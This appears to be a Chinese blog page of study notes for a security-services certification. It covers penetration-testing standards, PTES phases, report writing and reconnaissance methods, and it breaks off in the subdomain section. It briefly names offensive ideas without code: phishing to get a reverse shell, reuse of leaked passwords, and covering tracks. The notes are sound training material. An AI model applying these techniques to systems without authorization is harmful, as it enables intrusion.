网络安全运营服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2-1-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E6%9C%8D%E5%8A%A1%E5%9F%BA%E7%A1%80"><span class="toc-text">5.2.1 安全运营服务基础</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-2-2-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF"><span class="toc-text">5.2.2 安全运营服务技术</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E6%B5%81%E7%A8%8B%E5%BB%BA%E8%AE%BE"><span class="toc-text">第三部分 网络安全运营流程建设</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-3-1-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E4%B8%AD%E5%BF%83%E7%9A%84%E5%87%86%E5%A4%87%E5%92%8C%E8%A7%84%E5%88%92"><span class="toc-text">5.3.1 安全运营中心的准备和规划</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-3-2-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E4%B8%AD%E5%BF%83%E7%9A%84%E5%AE%9E%E6%96%BD"><span class="toc-text">5.3.2 安全运营中心的实施</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-3-3-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E4%B8%AD%E5%BF%83%E7%9A%84%E8%BF%90%E8%90%A5%E5%92%8C%E6%94%B9%E8%BF%9B"><span class="toc-text">5.3.3 安全运营中心的运营和改进</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E7%AB%A0-%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8"><span class="toc-text">第六章 企业安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-%E5%9F%BA%E7%BA%BF%E7%AE%A1%E7%90%86%E4%B8%8E%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E6%8F%90%E5%8D%87"><span class="toc-text">第一部分 基线管理与安全配置提升</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-1-%E5%9F%BA%E7%BA%BF%E7%AE%A1%E7%90%86%E6%A6%82%E8%BF%B0"><span class="toc-text">6.1.1 基线管理概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-2-windows%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">6.1.2 windows安全配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-3-linux%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">6.1.3 linux安全配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-4-apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">6.1.4 apache安全配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-5-mariadb%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">6.1.5 mariadb安全配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-1-6-mongodb%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">6.1.6 mongodb安全配置</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86-%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E7%AE%A1%E7%90%86%E5%A4%84%E7%BD%AE"><span class="toc-text">第二部分 安全事件管理处置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-1-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AE%80%E4%BB%8B"><span class="toc-text">6.2.1 应急响应简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-2%E4%BA%8B%E4%BB%B6%E5%88%86%E7%BA%A7%E5%88%86%E7%B1%BB"><span class="toc-text">6.2.2事件分级分类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-3-%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%BD%AE%E6%80%9D%E8%B7%AF%E6%8C%87%E5%AF%BC"><span class="toc-text">6.2.3 安全事件处置思路指导</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-4-%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%BD%AE%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-text">6.2.4 安全事件处置案例分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-5-windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-text">6.2.5 windows应急响应</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-6-windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7%E4%B8%8E%E6%97%A5%E5%BF%97"><span class="toc-text">6.2.6 windows应急响应工具与日志</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-2-7-linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-text">6.2.7 linux应急响应</span></a></li></ol></li></ol></li></ol></li></ol>
      
  </div>
</div>
</div>
          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="mX1@0" class="lazyload">
  <div class="sidebar-author-name">mX1@0</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Post</div>
    <div class="sidebar-state-number">60</div>
  </div>
  <div class="sidebar-state-category">
    <div>Category</div>
    <div class="sidebar-state-number">26</div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tag</div>
    <div class="sidebar-state-number">69</div>
  </div>
</div>
<div class="sidebar-social">
  
    <div class="icon-twitter sidebar-social-icon">
      <a href=https://x.com/0xMx1a0 itemprop="url" target="_blank" aria-label="twitter" rel="noopener external nofollow noreferrer"></a>
    </div>
  
</div>
<div class="sidebar-menu">
  
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">首页</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归类"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">归类</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">关于</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">友链</div>
      </div>
    
  
</div>
</div>
        
      
      
        
          <div class="sidebar-btn-wrapper" style="position:static">
            <div class="sidebar-toc-btn current"></div>
            <div class="sidebar-common-btn"></div>
          </div>
        
      
    </div>
  </div>

  <div class="sidebar-widget">
  
  </div>
  
</aside>

          <section id="main"><article id="post-深信服安全服务认证工程师学习笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-inner" data-aos="fade-up">
    <div class="article-meta">
      <div class="article-date">
  <span class="article-date-link" data-aos="zoom-in">
    <time datetime="2024-09-30T11:41:49.188Z" itemprop="datePublished">2024-09-30</time>
    <time style="display: none;" id="post-update-time">2025-08-20</time>
  </span>
</div>

      
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%AC%94%E8%AE%B0%E5%AD%A6%E4%B9%A0/" data-aos="zoom-in">笔记学习</a>
  </div>


    </div>
    <div class="hr-line"></div>
    

    <div class="e-content article-entry" itemprop="articleBody">
      
      
        <h1 id="深信服安全服务认证工程师学习笔记"><a href="#深信服安全服务认证工程师学习笔记" class="headerlink" title="深信服安全服务认证工程师学习笔记"></a>深信服安全服务认证工程师学习笔记</h1><h2 id="第一章-网络安全基础"><a href="#第一章-网络安全基础" class="headerlink" title="第一章 网络安全基础"></a>第一章 网络安全基础</h2><h3 id="第一部分-网络安全基础"><a href="#第一部分-网络安全基础" class="headerlink" title="第一部分 网络安全基础"></a>第一部分 网络安全基础</h3><h3 id="第二部分-操作系统配置与应用"><a href="#第二部分-操作系统配置与应用" class="headerlink" title="第二部分 操作系统配置与应用"></a>第二部分 操作系统配置与应用</h3><h3 id="第三部分-计算机网络原理与应用"><a href="#第三部分-计算机网络原理与应用" class="headerlink" title="第三部分 计算机网络原理与应用"></a>第三部分 计算机网络原理与应用</h3><h2 id="第二章-网络渗透测试基础"><a href="#第二章-网络渗透测试基础" class="headerlink" title="第二章 网络渗透测试基础"></a>第二章 网络渗透测试基础</h2><h3 id="第一部分-渗透测试概述"><a href="#第一部分-渗透测试概述" class="headerlink" title="第一部分 渗透测试概述"></a>第一部分 渗透测试概述</h3><h4 id="2-1-1-渗透测试标准与流程"><a href="#2-1-1-渗透测试标准与流程" class="headerlink" title="2.1.1 渗透测试标准与流程"></a>2.1.1 渗透测试标准与流程</h4><h5 id="渗透测试概述"><a href="#渗透测试概述" class="headerlink" title="渗透测试概述"></a>渗透测试概述</h5><ol>
<li>渗透测试</li>
</ol>
<p>​		渗透测试(Penetration Testing)是一种通过<strong>模拟攻击</strong>的技术与方法，挫败目标系统的安全控制措施并获得控制访问权的<strong>安全测试</strong>方法。</p>
<p>​		网络渗透测试主要依据CVE(Common Vulnerabilities and Exposures)已经发现的安全漏洞，模拟入侵者的攻击方法对网站应用、服务器系统和网络设备进行<strong>非破坏性质</strong>的攻击性测试。</p>
<ul>
<li>CVE：Common Vulnerabilities and Exposures，通用漏洞与披露<ul>
<li><a target="_blank" rel="noopener" href="http://cve.mitre.org/">http://cve.mitre.org</a></li>
</ul>
</li>
<li>CWE：Common Weakness Enumeration，通用缺陷列表<ul>
<li><a target="_blank" rel="noopener" href="http://cwe.mitre.org/data/definitions/79.html%EF%BC%8C">http://cwe.mitre.org/data/definitions/79.html，</a> XSS类漏洞<ul>
<li><a target="_blank" rel="noopener" href="http://cwe.mitre.org/data/definitions/89.html%EF%BC%8C">http://cwe.mitre.org/data/definitions/89.html，</a> SQL注入类漏洞</li>
</ul>
</li>
</ul>
</li>
</ul>
<ol start="2">
<li>渗透测试的必要性</li>
</ol>
<p>（1）为什么要进行渗透测试?</p>
<ul>
<li><p>百密一疏，新系统可能存在知的安全风险</p>
</li>
<li><p>未雨绸缪，而不是亡羊补牢</p>
</li>
<li><p>专业的渗透测试后，即使系统未被攻破，也可以以此证明先前实行的防御是有效的</p>
</li>
<li><p>专业的渗透测试可以有效评估系统的安全状况，并提出合理的改进方案</p>
</li>
</ul>
<p>（2）目的</p>
<ul>
<li>侵入系统获取机密信息，并将入侵的过程和细节产生报告提供给用户，由此确定用户系统存在的安全威胁，并能提醒安全管理员完善安全策略，降低安全风险</li>
</ul>
<ol start="3">
<li>渗透测试的原则</li>
</ol>
<p>渗透测试过程的最大风险：测试过程中对业务产生影响</p>
<ul>
<li>渗透测试是一个渐进的并且逐步深入的过程</li>
<li>渗透测试是选择不影响业务系统正常运行的攻击方法进行的测试</li>
</ul>
<p>合规性：<strong>符合规范和法律要求</strong>也是执行渗透测试业务的一个必要条件(渗透测试必须使用一些通过规范审核后的工具)</p>
<ol start="4">
<li>渗透测试与APT</li>
</ol>
<p>（1）目的</p>
<ul>
<li>渗透测试的目的是评估计算机网络系统的安全性</li>
<li>APT的目的是对高价值目标进行有组织、长期持续性的控制</li>
</ul>
<p>（2）手段方法</p>
<ul>
<li>渗透测试通过被允许的行为模拟黑客攻击来对目标系统进行测试</li>
<li>APT利用任何各种高技术手段(包括0day漏洞、“水坑”攻击、“鱼叉”攻击等)进行攻击</li>
</ul>
<p>（3）结果</p>
<ul>
<li><p>渗透测试提高了目标系统的安全级别</p>
</li>
<li><p>APT在达成目的的过程中一般会给目标系统带来严重损失</p>
</li>
</ul>
<h5 id="渗透测试分类"><a href="#渗透测试分类" class="headerlink" title="渗透测试分类"></a>渗透测试分类</h5><ol>
<li>根据渗透测试方法分类</li>
</ol>
<ul>
<li>黑盒测试：将测试对象看作一个黑盒子，完全不考虑测试对象的内部结构和内部特性。</li>
<li>白盒测试：把测试对象看作一个打开的盒子，测试人员依据测试对象内部逻辑结构相关信息，设计或选择测试用例。</li>
<li>灰盒测试：介于白盒与黑盒之间，是基于对测试对象内部细节有限认知的软件测试方法。</li>
</ul>
<ol start="2">
<li>根据渗透测试目标分类</li>
</ol>
<ul>
<li>主机操作系统渗透：对Windows、Solaris、AIX、Linux、SCO、SGl等操作系统本身进行渗透测试。</li>
<li>数据库系统渗透：对MS-SQL、Oracle、MySQL、Informix、Sybase、DB2、Access等数据库应用系统进行渗透测试。</li>
<li>应用系统渗透：对渗透目标提供的各种应用，如ASP、CG1、JSP、PHP等组成的WWW应用进行渗透测试。</li>
<li>网络设备渗透：对各种防火墙、入侵检测系统、路由器、交换机等网络设备进行渗透测试。</li>
</ul>
<ol start="3">
<li>根据渗透测试的位置分类</li>
</ol>
<ul>
<li>内网渗透：模拟客户内部违规操作者的行为，在内网中对目标进行渗透测试</li>
<li>外网渗透：模拟对内部状态一无所知的外部攻击者的行为(包括对网络设备的远程攻击、口令管理安全性测试、防火墙规则试探与规避、Web及其他开放应用服务的安全性测试等)，从外网对目标进行渗透测试</li>
</ul>
<ol start="4">
<li>针对Web服务体系架构的渗透测试</li>
</ol>
<ul>
<li>服务器渗透测试：对服务器自身的安全性(如操作系统、数据库是否存在弱口令等)进行检测。</li>
<li>中间件渗透测试：对Apache、lS、Tomcat、Nginx等Web中间件的漏洞(如配置缺陷、文件解析、反序列化漏洞等)进行检测。</li>
<li>Web应用渗透测试：对CMS、Blog等Web应用程序的洞(如SQL注入、XSS、CSRF、文件上传与解析、文件包含、命令执行等)进行检测。</li>
<li>业务逻辑渗透测试：对业务逻辑安全性(如验证逻辑问题、会话管理问题、权限控制问题等)进行检测。</li>
</ul>
<h5 id="渗透测试标准与执行流程"><a href="#渗透测试标准与执行流程" class="headerlink" title="渗透测试标准与执行流程"></a>渗透测试标准与执行流程</h5><ol>
<li>渗透测试标准</li>
</ol>
<ul>
<li>安全测试方法学开源手册(OSSTMM)</li>
<li>网络安全测试指南(NIST SP 800-42)</li>
<li>OWASP 十大Web应用安全威胁项目(OWASP TOP 10)</li>
<li>Web应用安全威胁分类标准(WASC-TC)</li>
<li><strong>渗透测试执行标准(PTES)</strong></li>
</ul>
<ol start="2">
<li>《渗透测试执行标准》</li>
</ol>
<p>​		《渗透测试执行标准》(PTES:Penetration Testing Execution Standard)的核心理念是通过建立起进行渗透测试所要求的基本准则基线，来定义一次真正的渗透测试过程，并得到安全业界的广泛认同。</p>
<p>​		PTES将渗透测试过程分为七个阶段，并在每个阶段中定义不同的扩展级别，而选择哪种级别则由被测试的客户组织决定。</p>
<p><img src="https://pic.imgdb.cn/item/67403caad29ded1a8cc70249.png"></p>
<p>（1）第一阶段–前期交互阶段</p>
<ul>
<li>在前期交互(Pre-Engagement Interaction)阶段，渗透测试团队与客户组织进行交互讨论，最重要的是**<u>确定渗透测试的范围、目标、限制条件以及服务合同细节</u>**</li>
<li>该阶段通常涉及收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标、项目管理与规划等活动。</li>
<li>客户**<u>书面授权委托</u><strong>，并同意实施方案是进行渗透测试的</strong>必要条件<strong>。渗透测试首先必须将实施方法、实施时间、实施人员、实施工具等具体的实施方案提交给客户，并得到客户的相应书面委托和授权。应该做到客户对渗透测试所有细节和风险的知晓，</strong>所有过程都在客户的控制下进行**。</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/6740404ed29ded1a8cc9ac29.png"></p>
<p>（2）第二阶段–信息收集阶段</p>
<ul>
<li>信息收集是每一步渗透攻击的前提，通过信息收集可以有针对性地制定模拟攻击测试计划，提高模拟攻击的成功率，同时可以有效地降低攻击测试对系统正常运行造成的不利影响，</li>
<li>信息收集的方法包括DNS探测、操作系统指纹判别、应用判别、账号扫描、配置判别等。信息收集常用的工具:<ul>
<li>商业网络安全漏洞扫描软件Nessus、开源安全检测工具Nmap等</li>
<li>操作系统内置的许多功能(Telnet、Nslookup、IE等)也可以作为信息收集的有<br>  效工具。</li>
</ul>
</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/67404115d29ded1a8cca52a0.png"></p>
<p>（3）第三阶段–威胁建模阶段</p>
<ul>
<li>威胁建模主要使用在信息收集分析阶段所获取到的信息，来标识出目标系统上可能存在的安全漏洞与弱点。</li>
<li>在进行威胁建模时，将确定最为高效的攻击方法、所需要进一步获取到的信息以及从哪里攻破目标系统。</li>
<li>在威胁建模阶段，通常需要将客户组织作为敌手看待，然后以<strong>攻击者的视角</strong>和思维来尝试利用目标系统的弱点。</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/6740418bd29ded1a8ccab49b.png"></p>
<p>（4）第四阶段–漏洞分析阶段</p>
<ul>
<li>漏洞分析阶段主要是从前面几个环节获取的信息中分析和理解哪些攻击途径会是可行的。</li>
<li>特别需要重点分析端口和漏洞扫描结果、取到的服务“旗帜”信息以及在信息收集分析环节中得到的其他关键信息。</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/6740422ad29ded1a8ccb30ac.png"></p>
<p>（5）第五阶段–渗透测试阶段</p>
<ul>
<li>渗透攻击主要是针对目标系统实施深入研究和测试的渗透攻击，并不是进行大量漫无目的的渗透测试。主要包括:<ul>
<li>精准打击</li>
<li>绕过防御机制</li>
<li>定制渗透攻击路径</li>
<li>绕过检测机制</li>
<li>触发攻击响应控制措施</li>
<li>渗透代码测试</li>
</ul>
</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/674042a8d29ded1a8ccb93f5.png"></p>
<p>（6）第六阶段–后渗透测试阶段</p>
<ul>
<li>后渗透攻击阶段从已经攻陷了客户组织的一些系统或取得域管理员权限之后开始，将以特定业务系统为目标，标识出关键的基础设施，并寻找客户组织最具价值和尝试进行安全保护的信息和资产，并需要演示出能够对客户组织造成最重要业务影响的攻击途径。主要包括<ul>
<li>基础设施分析</li>
<li>高价值目标识别</li>
<li>掠夺敏感信息</li>
<li>业务影响攻击</li>
<li>掩踪灭迹</li>
<li>持续性存在</li>
</ul>
</li>
</ul>
<p><img src="https://pic.imgdb.cn/item/6740432fd29ded1a8ccc0f6b.png"></p>
<p>（7）第七阶段–报告阶段</p>
<ul>
<li>报告是渗透测试过程中最为重要的因素，将使用报告文档来交流在渗透测试过程中做了哪些、如何做的，以及最为重要的一<strong>客户组织如何修复你所发现的安全漏洞与弱点</strong></li>
</ul>
<ol start="3">
<li>注意事项</li>
</ol>
<ul>
<li>在前期交互阶段，必须<strong>取得客户的授权</strong></li>
<li>取得客户的授权后，必须向<strong>公安部门等监管机构进行报备</strong></li>
<li>保证渗透测试过程中所用的工具都是合规的、经过检验的</li>
</ul>
<h4 id="2-1-2-渗透测试报告"><a href="#2-1-2-渗透测试报告" class="headerlink" title="2.1.2 渗透测试报告"></a>2.1.2 渗透测试报告</h4><h5 id="渗透测试报告的重要性"><a href="#渗透测试报告的重要性" class="headerlink" title="渗透测试报告的重要性"></a>渗透测试报告的重要性</h5><ol>
<li>编写渗透测试报告的两大宗旨和难题</li>
</ol>
<ul>
<li>如何准确定位问题?</li>
<li>如何让甲方意识到问题的严重性?</li>
</ul>
<ol start="2">
<li>渗透测试必须包含</li>
</ol>
<ul>
<li>该漏洞对企业资产的影响状况(可能造成的问题)</li>
<li>合理的漏洞分级标准及相应漏洞的分级</li>
<li>系统整体加固建议(如漏洞修复建议、安全防护措施等)</li>
</ul>
<ol start="3">
<li>渗透测试报告给谁看</li>
</ol>
<ul>
<li>高级管理人员:不关心技术细节，只关心结果(安全不安全)</li>
<li>IT管理人员:对该组织的整体安全性感兴趣，同时也希望确保其特定的部门在测试过程中都没有发现任何重大问题。</li>
<li>IT技术人员:负责修复测试过程中发现的问题的人。他们想知道三件事:受影响系统的名称、该漏洞的严重程度以及如何解决它</li>
</ul>
<ol start="4">
<li>渗透测试报告的重要性</li>
</ol>
<ul>
<li>判定测试费用的重要依据</li>
<li>判定渗透测试团队优劣的重要依据</li>
<li>判定测试是否成功的重要依据</li>
</ul>
<h5 id="正确编写渗透测试报告"><a href="#正确编写渗透测试报告" class="headerlink" title="正确编写渗透测试报告"></a>正确编写渗透测试报告</h5><ol>
<li>必须具备的品质</li>
</ol>
<ul>
<li>简单明了，直击要害<ul>
<li>关键部分干练的语言是报告的精髓所在</li>
<li>让客户明白问题在哪里，而不是去报告中找问题</li>
<li>说明可能造成的危害，体现渗透测试的价值</li>
</ul>
</li>
<li>尽可能通俗易懂<ul>
<li>能让客户准确定位并修补漏洞</li>
<li>给出漏洞利用手段或exp</li>
<li>给出漏洞修补建议</li>
</ul>
</li>
<li>满足甲方需求<ul>
<li>指引需求—些甲方可能在测试前不知道他们想要什么样的结果</li>
<li>甲方需求明确时，严格按照甲方的要求进行测试</li>
</ul>
</li>
</ul>
<ol start="2">
<li>报告基本组成要素</li>
</ol>
<ul>
<li>封面</li>
<li>内容提要</li>
<li>漏洞概览及目录</li>
<li>使用的工具列表</li>
<li>报告主体</li>
</ul>
<ol start="3">
<li>报告的基本要素–封面</li>
</ol>
<ul>
<li>公司名称、标志</li>
<li>测试的范畴(如:内网测试)</li>
<li>测试时间</li>
<li>文档的保密级别(保密声明)</li>
<li>法律声明</li>
</ul>
<ol start="4">
<li>报告的基本要素–内容提要</li>
</ol>
<ul>
<li>尽量限制字数</li>
<li>明确指出客户所要求测试的系统是否安全</li>
<li>尽量不提及使用的工具、技术</li>
<li>让客户明白我们做了什么，接下来要做什么</li>
<li>最后一行应该是一个结论，即明确指出是该系统是安全还是不安全<ul>
<li>一个糟糕的总结：“总之，我们发现一些地方的安全策略运作良好，但有些地方并未遵从。这导致了一定风险，但并不是致命风险。“</li>
<li>一个优秀的总结：“总之，我们发现了某些地方没有遵守安全策略，这给组织带来了一定风险，因此我们必须声明该系统是不安全的。</li>
</ul>
</li>
</ul>
<ol start="5">
<li>报告的基本要素–漏洞概览及目录</li>
</ol>
<ul>
<li>一目了然(可以使用表格或图标等)</li>
<li>分类列举漏洞</li>
<li>可以包含漏洞的严重性</li>
</ul>
<img src="https://pic.imgdb.cn/item/674081ccd29ded1a8c034e22.png" style="zoom:67%;">

<ol start="6">
<li>报告的基本要素–使用的工具列表</li>
</ol>
<ul>
<li>列出所使用的工具</li>
<li>可以包含简要的工具说明</li>
</ul>
<ol start="7">
<li>报告的基本要素–报告主体</li>
</ol>
<ul>
<li>发现的每一个漏洞</li>
<li>发现漏洞使用的工具、payload、exp、影响范围和存在的隐患或危害等内容（切忌复制粘贴扫描器结果!)</li>
<li>漏洞修复建议</li>
</ul>
<p><u><strong>注意：加密传输报告</strong></u></p>
<ol start="8">
<li>报告模板</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/674083a5d29ded1a8c04e6d1.png"></p>
<p><img src="https://pic.imgdb.cn/item/674083c2d29ded1a8c04ff35.png"></p>
<p><img src="https://pic.imgdb.cn/item/674083dfd29ded1a8c051b4f.png"></p>
<p><img src="https://pic.imgdb.cn/item/674083f4d29ded1a8c052c9c.png"></p>
<h3 id="第二部分-渗透测试环境搭建与工具使用"><a href="#第二部分-渗透测试环境搭建与工具使用" class="headerlink" title="第二部分 渗透测试环境搭建与工具使用"></a>第二部分 渗透测试环境搭建与工具使用</h3><h2 id="第三章-信息收集"><a href="#第三章-信息收集" class="headerlink" title="第三章 信息收集"></a>第三章 信息收集</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="3-1-信息收集总览"><a href="#3-1-信息收集总览" class="headerlink" title="3.1 信息收集总览"></a>3.1 信息收集总览</h4><h5 id="信息收集的种类"><a href="#信息收集的种类" class="headerlink" title="信息收集的种类"></a>信息收集的种类</h5><h6 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h6><p>Domain Name system 域名系统</p>
<ul>
<li>提供域名与IP地址之间映射</li>
<li>大型企业网站运转核心</li>
</ul>
<p>收集原因</p>
<ul>
<li>确定企业网站运行规模</li>
<li>可以从DNS中收集子域名、IP等</li>
<li>控制网站解析</li>
</ul>
<h6 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h6><p>mail.XXX.com<br>收集原因</p>
<ul>
<li>确定企业网站运行数量，从而进行下一步(安全评估)准备</li>
<li>获得不同子域名所映射的IP，从而获得不同C段</li>
<li>寻找更大的<strong>安全脆弱点</strong>和面</li>
</ul>
<h6 id="C段"><a href="#C段" class="headerlink" title="C段"></a>C段</h6><p>什么是C段</p>
<ul>
<li>在IP地址的4段号码中，前3段号码为网络号码，剩下的1段号码为本地计算机的号码<br>  192.168.1.5/24</li>
</ul>
<p>收集原因</p>
<ul>
<li>确定C段存活主机数量</li>
<li>确定C段中主机的端口，服务，操作系统等</li>
</ul>
<h6 id="邮箱"><a href="#邮箱" class="headerlink" title="邮箱"></a>邮箱</h6><p>收集原因</p>
<ul>
<li>通过分析邮箱格式和后缀，可以得知邮箱命名规律和邮箱服务器</li>
<li>为爆破登录表单收集数据，可形成字典</li>
<li>发送钓鱼邮件，执行高级APT控制</li>
</ul>
<h6 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h6><ul>
<li><p>Web指纹<br>  获取运行的脚本语言，开发框架，CMS，寻找脆弱点(漏洞)<br>      如:.action一般可以确定为Struts2<br>      如:Powered by **</p>
</li>
<li><p>中间件指纹<br>  获取中间使用的产品和版本<br>  通过产品和版本查询是否有漏洞存在，如:struts2反序列化，iis文件解析</p>
</li>
<li><p>系统指纹<br>  获取操作系统使用的产品和版本<br>  可以在以后渗透中提供渗透基准</p>
<p>  ​       如:大小写，shell部署方式</p>
</li>
</ul>
<h6 id="社工库"><a href="#社工库" class="headerlink" title="社工库"></a>社工库</h6><p>寻找指定目标的已经泄露的数据<br>如:邮箱，获取到企业内部人员已经泄露的密码，可以在撞库，爆破中使用<br>如:姓名，手机号，找回密码，重置信息</p>
<h6 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h6><ul>
<li>邮件、链接、办公文件</li>
<li>构造鱼叉攻击（广撒网攻击）和水坑攻击（定向攻击）</li>
<li>绕过边界防御设备</li>
<li>从内部瓦解防御网络，直接反弹shell</li>
</ul>
<h4 id="3-2-DNS介绍"><a href="#3-2-DNS介绍" class="headerlink" title="3.2 DNS介绍"></a>3.2 DNS介绍</h4><h5 id="DNS基本原理"><a href="#DNS基本原理" class="headerlink" title="DNS基本原理"></a>DNS基本原理</h5><p><img src="https://pic.imgdb.cn/item/67458b1bd0e0a243d4d12f02.png"></p>
<p>主要使用UDP，但是也可以使用TCP</p>
<p><img src="https://pic.imgdb.cn/item/67458b88d0e0a243d4d12f23.png"></p>
<h5 id="DNS记录查询方法"><a href="#DNS记录查询方法" class="headerlink" title="DNS记录查询方法"></a>DNS记录查询方法</h5><ol>
<li>DNS A 记录</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/67458c72d0e0a243d4d12f5d.png"></p>
<p>dig工具参数</p>
<p>+short：简洁反馈</p>
<p>@server：指定域名解析器</p>
<p>+trace：查询过程进行跟踪</p>
<ol start="2">
<li>DNS NS 记录</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/67458d3fd0e0a243d4d12ff9.png"></p>
<ol start="3">
<li>DNS TXT 记录</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/67458e47d0e0a243d4d13213.png"></p>
<ol start="4">
<li>DNS MX 记录</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/67458eadd0e0a243d4d1331e.png"></p>
<ol start="5">
<li>DNS CNAME 记录</li>
</ol>
<p><img src="https://pic.imgdb.cn/item/67458ed8d0e0a243d4d1338d.png"></p>
<h5 id="域名信息查询方法"><a href="#域名信息查询方法" class="headerlink" title="域名信息查询方法"></a>域名信息查询方法</h5><p><img src="https://pic.imgdb.cn/item/67458f14d0e0a243d4d13419.png"></p>
<p><img src="https://pic.imgdb.cn/item/67458f50d0e0a243d4d134b1.png"></p>
<h5 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h5><h4 id="3-3-子域名收集"><a href="#3-3-子域名收集" class="headerlink" title="3.3 子域名收集"></a>3.3 子域名收集</h4><h5 id="子域名收集原因"><a href="#子域名收集原因" class="headerlink" title="子域名收集原因"></a>子域名收集原因</h5><ul>
<li>子域名枚举可以在测试范围内发现更多的域或子域，这将增大漏洞发现的机率。</li>
<li>有些隐藏的、被忽略的子域上运行的应用程序可能帮助我们发现重大漏洞。</li>
<li>在同一个组织的不同域或应用程序中往往存在相同的漏洞</li>
</ul>
<h5 id="子域名收集方法"><a href="#子域名收集方法" class="headerlink" title="子域名收集方法"></a>子域名收集方法</h5><ol>
<li>爆破</li>
</ol>
<ul>
